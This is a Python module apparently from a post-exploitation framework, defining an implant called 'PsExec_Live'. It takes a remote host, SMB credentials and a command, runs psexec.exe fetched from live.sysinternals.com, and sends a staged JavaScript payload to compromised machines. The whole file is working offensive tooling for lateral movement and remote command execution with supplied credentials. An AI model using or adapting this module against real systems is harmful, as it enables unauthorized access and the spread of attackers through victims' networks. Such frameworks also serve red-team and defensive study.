import core.job
import core.implant
import uuid
import os.path


class PsExecLiveJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        pass
        #self.shell.print_plain("Result for `%s`:" % self.options.get('CMD'))
        #self.shell.print_plain(self.data)

class PsExecLiveImplant(core.implant.Implant):

    NAME = "PsExec_Live"
    DESCRIPTION = "Executes a command on another system, utilizing live.sysinternals.com publicly hosted tools."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        self.options.register("CMD", "hostname", "command to run")
        self.options.register("RHOST", "", "name/IP of the remote")
        self.options.register("SMBUSER", "", "username for login")
        self.options.register("SMBPASS", "", "password for login")
        self.options.register("SMBDOMAIN", ".", "domain for login")
        #self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("RPATH", "\\\\\\\\live.sysinternals.com@SSL\\\\tools\\\\", "path to psexec.exe")
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        self.options.register("FILE", "", "random uuid for file name", hidden=True)

    def run(self):
        # generate new file every time this is run
        self.options.set("FILE", uuid.uuid4().hex)

        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/pivot/exec_psexec.js", self.options)
        self.dispatch(payloads, PsExecLiveJob)
